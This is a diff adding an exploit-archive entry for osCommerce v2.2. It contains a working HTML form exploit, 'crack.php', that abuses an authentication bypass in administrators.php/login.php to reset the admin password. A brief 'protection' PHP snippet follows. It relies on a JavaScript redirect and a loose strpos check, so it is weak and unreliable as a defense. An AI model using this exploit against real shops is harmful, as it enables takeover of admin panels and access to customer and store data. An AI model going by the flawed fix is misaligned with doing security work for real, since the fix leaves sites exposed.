@@ -1,0 +1,35 @@
+# Exploit Title: osCommerce v2.2 Change Admin Pass
+# Date: [date]
+# Author: daandeveloper33
+# Software Link: http://oscommerce.com/
+# Version: v2.2
+# Tested on: Mac OS X 10.6.4, osCommerce v2.2 RC2A (Dutch)
+
+This is the code that you can execute to change the admin pass:
+-------crack.php-------
+<?/*Author: daandeveloper33
+E-Mail: daandeveloper33@gmail.com
+Software: osCommerce v2.2
+Date: 09 Nov 2010
+Description: Change the admin password of the admin panel of oscommerce.And then you have got all admin privileges
+*/
+?>
+<HTML><BODY>
+<form name="administrator" action="http:/server/linktoadminpanel/administrators.php/login.php?aID=1&action=save" method="post"> Change Admin Pass
+    Username<br><input type="text" name="username" value="admin">
+    <br>Password<br><input type="password" name="password" maxlength="40"></td> 
+    <br><input type="submit" alt="Update" title=" Update " value="Change It!">     <a href="http://server/linktoadminpanel/administrators.php/login.php?aID=1">    </a>
+</form> 
+</BODY></HTML>
+----------------------------
+This is the code to protect against this attack:
+First Write protection.php:
+-------protection.php-----
+<?$self = $_SERVER['PHP_SELF'];
+$pos = strpos($self, 'login.php');if($pos == true){echo "<script language='javascript'>window.location = 'http://server/index.php';</script>";}?>----------------------------Save protection.php in the admin map of oscommercethen paste following code in all pages in the /admin map(expect login.php): include('protection.php')
+
+
+
+
+Greets,
+daandeveloper33 		 	   		  
